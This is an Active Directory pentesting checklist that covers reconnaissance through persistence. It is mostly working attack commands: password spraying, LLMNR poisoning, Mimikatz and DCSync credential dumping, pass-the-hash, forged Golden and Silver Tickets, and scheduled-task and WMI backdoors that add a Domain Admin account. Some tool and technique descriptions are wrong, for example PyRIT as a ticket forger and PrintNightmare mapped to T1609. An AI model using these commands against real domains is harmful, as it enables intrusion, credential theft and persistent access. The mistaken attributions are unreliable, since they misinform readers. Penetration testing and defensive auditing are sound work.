# Active Directory Pentesting Checklist

This checklist provides a detailed guide for pentesting an Active Directory (AD) environment, covering reconnaissance, enumeration, exploitation, and post-exploitation phases. Each step includes techniques, tools, and practical examples with explanations, incorporating the latest tools and methods from recent sources to identify and exploit AD vulnerabilities effectively.

## 1. Reconnaissance
Objective: Gather information about the target AD environment without direct interaction.

### 1.1 OSINT (Open-Source Intelligence)
- **Description**: Collect publicly available information about the organization’s AD infrastructure, such as domain names, employee details, and exposed services.
- **Techniques**:
  - Search for domain names on WHOIS, LinkedIn, or corporate websites.
  - Identify email formats (e.g., firstname.lastname@domain.com) from job postings, breach databases, or public leaks.
  - Check for exposed AD services (e.g., LDAP, SMB, ADCS) via Shodan, Censys, or DNS enumeration.
  - Analyze social media, GitHub, or pastebins for naming conventions, leaked credentials, or configuration files.
  - Extract metadata from public documents (e.g., PDFs, Word) for network or user details.
- **Tools**:
  - **theHarvester**: Gathers emails, subdomains, and employee names.
  - **Shodan/Censys**: Identifies exposed AD services (e.g., port 445/SMB, 389/LDAP, 80/ADCS).
  - **dnsrecon**: Enumerates DNS records for AD-related subdomains.
  - **Maltego**: Visualizes relationships between domains, emails, and infrastructure.
  - **Recon-ng**: Automates OSINT with modules for DNS, email, and social media.
  - **FOCA**: Extracts metadata from public documents.
  - **Hunter.io**: Finds email addresses associated with a domain.
  - **OSINT Framework**: Organizes OSINT tools and resources for structured reconnaissance.
- **Examples**:
  - Use `theHarvester` to find email addresses:
    ```bash
    theHarvester -d target.com -b google,linkedin,bing,pgp,duckduckgo,haveibeenpwned
    ```
    - **Explanation**: Searches multiple sources, including breach databases like Have I Been Pwned, to identify email patterns (e.g., john.doe@target.com) and subdomains like `dc01.target.com` for targeting.
  - Use `dnsrecon` for DNS enumeration:
    ```bash
    dnsrecon -d target.com -t axfr,brute -D /usr/share/wordlists/subdomains.txt
    ```
    - **Explanation**: Attempts DNS zone transfers and brute-forces subdomains, revealing AD infrastructure like `adcs.target.com`.
  - Use Hunter.io via API:
    ```bash
    curl -G "https://api.hunter.io/v2/domain-search" -d "domain=target.com" -d "api_key=<YOUR_API_KEY>"
    ```
    - **Explanation**: Retrieves email addresses for phishing or password spraying, leveraging verified sources.
  - Use OSINT Framework’s SpiderFoot:
    ```bash
    spiderfoot -s target.com -m sfp_dnsresolve,sfp_email,sfp_webcrawler
    ```
    - **Explanation**: Automates OSINT by resolving DNS, scraping emails, and crawling websites for AD-related data.

### 1.2 Network Scanning
- **Description**: Identify live hosts, open ports, and services exposing AD-related information.
- **Techniques**:
  - Perform port scans for AD services (e.g., 88/Kerberos, 389/LDAP, 445/SMB, 3389/RDP, 3268/Global Catalog, 80/ADCS).
  - Map the network to identify domain controllers, file servers, or misconfigured services.
  - Use passive scanning to avoid IDS/IPS detection.
  - Analyze network traffic for AD protocol patterns (e.g., Kerberos, NTLM).
  - Check for misconfigured DNS or LLMNR/NBNS responses.
- **Tools**:
  - **Nmap**: Scans for open ports and services.
  - **Masscan**: High-speed port scanning for large networks.
  - **Netdiscover**: Discovers active hosts via ARP.
  - **Wireshark**: Captures network traffic for AD protocols.
  - **FOCA**: Extracts metadata from documents.
  - **Angry IP Scanner**: Scans for live hosts and services.
  - **ADRecon**: Gathers AD-specific network information.
  - **Responder**: Captures LLMNR/NBNS/NTLM responses.
- **Examples**:
  - Run an Nmap scan for AD services:
    ```bash
    nmap -p 88,389,445,3389,636,3268,3269,80,443 192.168.1.0/24 --open -sV -oA ad_scan
    ```
    - **Explanation**: Scans for AD-related ports, including ADCS (80/443), identifying service versions and potential domain controllers.
  - Use Masscan for rapid scanning:
    ```bash
    masscan 192.168.1.0/24 -p88,389,445,3389,636,3268,80 --rate=1000
    ```
    - **Explanation**: Quickly identifies AD services in large networks for targeted enumeration.
  - Use Responder for LLMNR/NBNS poisoning:
    ```bash
    responder -I eth0 --wpad --lm
    ```
    - **Explanation**: Captures NTLM hashes by spoofing LLMNR/NBNS responses, enabling credential theft or relay attacks.
  - Use ADRecon for network reconnaissance:
    ```powershell
    .\ADRecon.ps1 -Domain target.com -Credential (Get-Credential)
    ```
    - **Explanation**: Collects comprehensive AD data (e.g., domain controllers, trusts, policies) from a compromised host.

## 2. Enumeration
Objective: Gather detailed information about the AD environment, including users, groups, computers, and policies.

### 2.1 User and Group Enumeration
- **Description**: Identify valid user accounts, groups, and privileges to target high-value accounts (e.g., Domain Admins).
- **Techniques**:
  - Enumerate users and groups via LDAP, SMB, or RPC.
  - Exploit null sessions or guest accounts to query AD without credentials.
  - Check for misconfigured shares, weak ACLs, or sensitive data in files.
  - Enumerate group memberships and nested groups for privileged accounts.
  - Search user descriptions or attributes for exposed credentials.
- **Tools**:
  - **enum4linux**: Enumerates SMB shares, users, and groups.
  - **ldapsearch**: Queries LDAP for user and group information.
  - **ADFind**: Queries AD via LDAP with detailed filters.
  - **rpcclient**: Enumerates users and groups via RPC.
  - **Netexec**: Automates AD enumeration and credential testing.
  - **Snaffler**: Finds sensitive data in file shares.
  - **PowerView**: Enumerates AD objects and permissions.
  - **ADExplorer**: Browses AD structure from Windows.
  - **ldapdomaindump**: Dumps AD data via LDAP.
- **Examples**:
  - Use `enum4linux` for SMB enumeration:
    ```bash
    enum4linux -U -G -S 192.168.1.10
    ```
    - **Explanation**: Extracts users, groups, and shares via SMB null sessions, identifying accounts for further attacks.
  - Use `ldapsearch` with anonymous access:
    ```bash
    ldapsearch -x -H ldap://192.168.1.10 -b "DC=target,DC=com" "(objectClass=user)" sAMAccountName description
    ```
    - **Explanation**: Queries LDAP anonymously for usernames and descriptions, which may contain passwords or sensitive data.
  - Use Netexec for user enumeration:
    ```bash
    netexec smb 192.168.1.10 -u '' -p '' --users --groups
    ```
    - **Explanation**: Lists users and groups via null sessions, effective in legacy environments.
  - Use ldapdomaindump for AD data:
    ```bash
    ldapdomaindump -u 'target.com\jdoe' -p 'Password123!' -d 192.168.1.10
    ```
    - **Explanation**: Dumps AD users, groups, and computers to HTML/JSON, providing a comprehensive overview.

### 2.2 Kerberos Enumeration
- **Description**: Enumerate valid usernames or services using Kerberos pre-authentication vulnerabilities.
- **Techniques**:
  - Use Kerberoasting to identify service accounts with weak passwords.
  - Perform ASREPRoast to find accounts without pre-authentication.
  - Enumerate users via Kerberos error codes (e.g., KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN).
  - Identify misconfigured SPNs or constrained delegation settings.
- **Tools**:
  - **Impacket**: Scripts for Kerberos attacks (e.g., GetUserSPNs.py, GetNPUsers.py).
  - **Kerbrute**: Enumerates usernames via Kerberos.
  - **Rubeus**: Performs Kerberos attacks from Windows.
  - **BloodHound**: Maps AD relationships for attack paths.
  - **Powermad**: Enumerates AD objects and Kerberos details.
  - **RiskySPN**: Detects vulnerable SPNs for Kerberoasting.
- **Examples**:
  - Use `Kerbrute` to enumerate users:
    ```bash
    kerbrute userenum -d target.com --dc 192.168.1.10 users.txt
    ```
    - **Explanation**: Validates usernames via Kerberos pre-authentication, minimizing lockout risks.
  - Use Impacket for ASREPRoast:
    ```bash
    python3 GetNPUsers.py target.com/ -dc-ip 192.168.1.10 -request -no-pass -usersfile users.txt
    ```
    - **Explanation**: Extracts hashes for accounts without pre-authentication, crackable offline.
  - Use RiskySPN to identify vulnerable SPNs:
    ```powershell
    Invoke-RiskySPNs -Domain target.com
    ```
    - **Explanation**: Detects SPNs prone to Kerberoasting, prioritizing high-value targets.
  - Use Powermad for SPN enumeration:
    ```powershell
    Invoke-SPNDiscovery
    ```
    - **Explanation**: Enumerates SPNs domain-wide, identifying service accounts for Kerberoasting.

## 3. Exploitation
Objective: Gain unauthorized access to the AD environment by exploiting vulnerabilities or misconfigurations.

### 3.1 Password Attacks
- **Description**: Exploit weak or default credentials to gain initial access.
- **Techniques**:
  - **Password Spraying**: Test common passwords across multiple accounts.
  - **Credential Dumping**: Extract credentials from memory, files, or databases.
  - **Brute Force**: Target specific accounts with password lists (if lockout policies allow).
  - **NTLM Relay Attacks**: Capture and relay authentication attempts.
  - **Password Guessing via RID Cycling**: Guess passwords using Relative Identifier (RID) enumeration.
  - **Spraying OWA/Skype**: Target Outlook Web Access or Skype for Business with credential spraying.
- **Tools**:
  - **CrackMapExec**: Performs password spraying and SMB attacks.
  - **Mimikatz**: Dumps credentials from memory.
  - **Hydra**: Brute-forces credentials for various protocols.
  - **Responder**: Captures NTLM hashes from network traffic.
  - **Hashcat**: Cracks password hashes offline.
  - **John the Ripper**: Alternative for hash cracking.
  - **CME (Netexec)**: Automates credential attacks and RID cycling.
  - **LaZagne**: Extracts passwords from local applications.
  - **Atomizer**: Sprays credentials against OWA or Skype for Business.
- **Examples**:
  - Perform password spraying with CrackMapExec:
    ```bash
    crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2025!' --continue-on-success
    ```
    - **Explanation**: Tests a common password across users, identifying valid credentials without triggering lockouts.
  - Use Atomizer for OWA spraying:
    ```bash
    atomizer.py owa target.com 'Fall2025' users.txt
    ```
    - **Explanation**: Sprays credentials against Outlook Web Access, identifying valid accounts for further exploitation.
  - Use LaZagne for local credential extraction:
    ```bash
    laZagne.exe all
    ```
    - **Explanation**: Extracts passwords from browsers, email clients, and other applications on a compromised host.
  - Use Responder for NTLM relay:
    ```bash
    responder -I eth0 --wpad --lm
    ```
    - **Explanation**: Captures NTLM hashes via rogue WPAD or SMB servers, enabling relay or cracking.

### 3.2 Kerberoasting
- **Description**: Exploit service accounts with weak passwords by requesting and cracking Kerberos service tickets.
- **Techniques**:
  - Request Ticket Granting Service (TGS) tickets for service accounts.
  - Crack tickets offline to recover passwords.
  - Exploit misconfigured Service Principal Names (SPNs).
  - Target AD Certificate Services (ADCS) for certificate-based attacks.
  - Abuse constrained delegation for service access.
- **Tools**:
  - **Impacket (GetUserSPNs.py)**: Requests TGS tickets.
  - **Hashcat**: Cracks Kerberos hashes.
  - **Rubeus**: Performs Kerberoasting from Windows.
  - **tgsrepcrack**: Cracks TGS tickets.
  - **Certify**: Enumerates and attacks ADCS.
  - **PKINITtools**: Exploits Kerberos PKINIT vulnerabilities.
  - **StandIn**: Enumerates and exploits delegation settings.
- **Examples**:
  - Request TGS tickets with Impacket:
    ```bash
    python3 GetUserSPNs.py -dc-ip 192.168.1.10 target.com/jdoe:Password123! -request -outputfile kerberoast_hashes.txt
    ```
    Crack with Hashcat:
    ```bash
    hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
    ```
    - **Explanation**: Extracts and cracks TGS ticket hashes, revealing weak service account passwords.
  - Use StandIn for constrained delegation:
    ```powershell
    StandIn.exe --kerberos --dc 192.168.1.10
    ```
    - **Explanation**: Enumerates accounts with constrained delegation, exploitable for service-specific access.
  - Use Certify to exploit ADCS:
    ```powershell
    Certify.exe find /vulnerable
    ```
    - **Explanation**: Identifies ADCS templates allowing unauthorized certificate issuance, enabling privilege escalation.[](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)

### 3.3 Pass-the-Hash (PtH)
- **Description**: Use stolen NTLM hashes to authenticate to other systems without plaintext passwords.
- **Techniques**:
  - Extract NTLM hashes from memory or files.
  - Use hashes to authenticate to SMB, RDP, or other services.
  - Relay captured hashes for lateral movement.
  - Perform overpass-the-hash to obtain Kerberos tickets.
- **Tools**:
  - **Mimikatz**: Dumps NTLM hashes.
  - **CrackMapExec**: Uses hashes for authentication.
  - **PsExec**: Executes commands using stolen hashes.
  - **Impacket (wmiexec.py)**: Executes commands via WMI with hashes.
  - **Rubeus**: Performs overpass-the-hash attacks.
  - **evil-winrm**: Authenticates via WinRM with hashes.
- **Examples**:
  - Dump hashes with Mimikatz:
    ```powershell
    sekurlsa::logonpasswords
    ```
    Use with CrackMapExec:
    ```bash
    crackmapexec smb 192.168.1.10 -u jdoe -H 'aad3b435b51404eeaad3b435b51404ee:31d6...'
    ```
    - **Explanation**: Mimikatz extracts NTLM hashes; CrackMapExec uses them for authentication.
  - Use evil-winrm with a hash:
    ```bash
    evil-winrm -i 192.168.1.10 -u jdoe -H 31d6...
    ```
    - **Explanation**: Authenticates to a host via WinRM using a stolen hash, enabling remote command execution.[](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)
  - Use Rubeus for overpass-the-hash:
    ```powershell
    Rubeus.exe pth /user:jdoe /rc4:31d6... /domain:target.com
    ```
    - **Explanation**: Converts an NTLM hash into a Kerberos TGT for broader access.

## 4. Privilege Escalation
Objective: Elevate access from a standard user to Domain Admin or Enterprise Admin.

### 4.1 Abusing Group Policy Objects (GPOs)
- **Description**: Exploit misconfigured GPOs to execute malicious scripts or gain elevated privileges.
- **Techniques**:
  - Identify GPOs with excessive permissions (e.g., users with edit rights).
  - Modify GPOs to run malicious scripts or grant admin rights.
  - Exploit GPO delegation or unconstrained delegation vulnerabilities.
  - Check SYSVOL for sensitive data in scripts or configurations.
- **Tools**:
  - **BloodHound**: Maps AD relationships for escalation paths.
  - **PowerView**: Enumerates GPO permissions.
  - **SharpGPOAbuse**: Exploits GPO misconfigurations from Windows.
  - **ADACLScanner**: Analyzes AD ACLs for misconfigurations.
  - **StandIn**: Enumerates GPO and delegation issues.
  - **Group3r**: Identifies GPO misconfigurations.
- **Examples**:
  - Use PowerView to find GPOs with weak permissions:
    ```powershell
    Get-DomainGPO | Where-Object { $_ | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -match "S-1-5-11" } }
    ```
    - **Explanation**: Identifies GPOs editable by Authenticated Users, exploitable for malicious script execution.
  - Use Group3r to enumerate GPOs:
    ```powershell
    Invoke-Group3r -Domain target.com
    ```
    - **Explanation**: Finds GPOs with sensitive settings or credentials in SYSVOL, exploitable for escalation.
  - Use SharpGPOAbuse to modify a GPO:
    ```powershell
    SharpGPOAbuse.exe --AddUser --UserAccount hacker --GPOName "Default Domain Policy" --Domain target.com
    ```
    - **Explanation**: Adds a backdoor user to a GPO, granting admin rights when applied.

### 4.2 DCSync Attack
- **Description**: Exploit accounts with replication rights to extract all AD credentials, including Domain Admin hashes.
- **Techniques**:
  - Identify accounts with `Replicating Directory Changes All` permissions.
  - Use DCSync to replicate AD data, including password hashes.
  - Exploit GenericAll or GenericWrite permissions on sensitive objects.
  - Abuse shadow credentials to add alternate credentials to accounts.
- **Tools**:
  - **Mimikatz**: Performs DCSync attacks.
  - **BloodHound**: Identifies accounts with replication rights.
  - **SecretsDump**: Extracts credentials via DCSync.
  - **Netexec**: Automates DCSync with credentials.
  - **PowerSploit**: Enumerates and exploits AD permissions.
  - **Locksmith**: Detects and exploits shadow credentials.
- **Examples**:
  - Perform a DCSync attack with Mimikatz:
    ```powershell
    lsadump::dcsync /domain:target.com /user:krbtgt
    ```
    - **Explanation**: Extracts the krbtgt hash for Golden Ticket attacks.
  - Use Locksmith for shadow credentials:
    ```powershell
    Invoke-Locksmith -Mode ShadowCredentials -Identity jdoe
    ```
    - **Explanation**: Adds a shadow credential to the `jdoe` account, enabling authentication without the original password.
  - Use SecretsDump for DCSync:
    ```bash
    secretsdump.py target.com/jdoe:Password123!@192.168.1.10 -just-dc-user krbtgt
    ```
    - **Explanation**: Dumps the krbtgt hash, providing full domain control.

## 5. Post-Exploitation
Objective: Maintain access, exfiltrate data, or achieve persistence in the AD environment.

### 5.1 Golden and Silver Ticket Attacks
- **Description**: Forge Kerberos tickets (Golden for TGTs, Silver for specific services) using the krbtgt or service account hashes for persistent access.
- **Techniques**:
  - Extract the krbtgt hash via DCSync for Golden Tickets.
  - Extract service account hashes for Silver Tickets targeting services (e.g., CIFS, HOST).
  - Use forged tickets for domain-wide or service-specific access.
  - Exploit resource-based constrained delegation for targeted access.
- **Tools**:
  - **Mimikatz**: Generates Golden and Silver Tickets.
  - **Rubeus**: Creates tickets from Windows.
  - **Impacket (ticketer.py)**: Forges Kerberos tickets.
  - **PyRIT**: Automates ticket creation and attacks.
  - **rbcd-attack**: Exploits resource-based constrained delegation.
- **Examples**:
  - Create a Golden Ticket with Mimikatz:
    ```powershell
    kerberos::golden /user:Administrator /domain:target.com /sid:S-1-5-21-... /krbtgt:31d6... /id:500
    ```
    - **Explanation**: Forges a TGT for domain-wide access as Administrator.
  - Create a Silver Ticket with Rubeus:
    ```powershell
    Rubeus.exe silver /service:cifs/dc01.target.com /rc4:31d6... /user:jdoe /domain:target.com
    ```
    - **Explanation**: Forges a ticket for the CIFS service on dc01, granting file share access.
  - Use rbcd-attack for delegation:
    ```bash
    python3 rbcd.py -dc-ip 192.168.1.10 -from 'comp1$' -to 'dc01$' target.com/jdoe:Password123!
    ```
    - **Explanation**: Exploits resource-based constrained delegation to impersonate users on dc01.[](https://github.com/theyoge/AD-Pentesting-Tools)

### 5.2 Persistence via Scheduled Tasks and Backdoors
- **Description**: Create scheduled tasks, backdoor accounts, or malicious services to maintain access.
- **Techniques**:
  - Use compromised credentials to create tasks or services executing malicious scripts.
  - Add backdoor accounts to privileged groups.
  - Deploy persistence via registry, WMI subscriptions, or ADCS backdoors.
  - Exploit PrintNightmare to deploy persistent malicious drivers.
- **Tools**:
  - **PowerShell**: Creates scheduled tasks and backdoors.
  - **Schtasks**: Native Windows tool for task scheduling.
  - **Empire**: Deploys post-exploitation agents.
  - **Covenant**: Command and control framework for persistence.
  - **SharPersist**: Implements various persistence techniques.
  - **Coercer**: Exploits PrintNightmare and other vulnerabilities.
- **Examples**:
  - Create a scheduled task with PowerShell:
    ```powershell
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -Command 'net user hacker Password123! /add /domain; net group \"Domain Admins\" hacker /add /domain'"
    $trigger = New-ScheduledTaskTrigger -Daily -At "12:00"
    Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger -User "SYSTEM"
    ```
    - **Explanation**: Creates a daily task to add a backdoor user to Domain Admins.
  - Use Coercer for PrintNightmare exploitation:
    ```bash
    coercer coerce -t 192.168.1.10 -u jdoe -p Password123! --listener 192.168.1.100
    ```
    - **Explanation**: Exploits PrintNightmare to trigger NTLM authentication, capturing hashes for persistence.[](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
  - Use SharPersist for WMI persistence:
    ```powershell
    SharPersist.exe -t wmi -c "C:\Windows\System32\cmd.exe" -a "/c net user hacker Password123! /add /domain" -n "Backdoor"
    ```
    - **Explanation**: Creates a WMI subscription to execute a backdoor command, ensuring persistence.

## 6. Reporting and Recommendations
Objective: Document findings and provide mitigation strategies.

- **Description**: Compile a detailed report of vulnerabilities, exploitation steps, and remediation advice.
- **Techniques**:
  - Document findings with evidence (e.g., screenshots, logs, BloodHound graphs).
  - Map attacks to MITRE ATT&CK framework (e.g., T1558 for Kerberoasting, T1649 for ADCS).
  - Suggest mitigations like enabling Kerberos pre-authentication, restricting GPO permissions, implementing LAPS, monitoring with Lepide, deploying Azure AD security features, and auditing ADCS templates.
- **Tools**:
  - **Markdown/Pandoc**: Generates professional reports.
  - **CherryTree**: Organizes pentest notes.
  - **Dradis**: Collaborative reporting for teams.
  - **ReportGen**: Automates report generation for pentests.
  - **PingCastle**: Audits AD security and generates reports.
- **Example**:
  - Sample report structure:
    ```markdown
    # Pentest Report: Target.com AD
    ## Executive Summary
    - Identified weak passwords, misconfigured GPOs, ADCS vulnerabilities, and replication rights abuse.
    ## Findings
    - **Kerberoasting (T1558.003)**: Extracted svc_sql password (Impact: High).
    - **DCSync (T1003.006)**: Obtained krbtgt hash (Impact: Critical).
    - **ADCS Misconfiguration (T1649)**: Vulnerable certificate template allowed unauthorized access.
    - **PrintNightmare (T1609)**: Exploited to capture NTLM hashes.
    ## Recommendations
    - Enforce complex passwords (15+ characters) for service accounts.
    - Restrict replication rights to essential accounts.
    - Deploy Microsoft LAPS for local admin password management.
    - Audit ADCS templates with Certify and disable vulnerable ones.
    - Monitor AD with Lepide Change Reporter or Azure Sentinel.
    - Patch PrintNightmare vulnerabilities (CVE-2021-34527).
    ```
  - **Explanation**: Maps findings to MITRE ATT&CK TTPs, provides evidence, and aligns recommendations with NIST and CIS benchmarks.[](https://www.lepide.com/blog/top-10-active-directory-attack-methods/)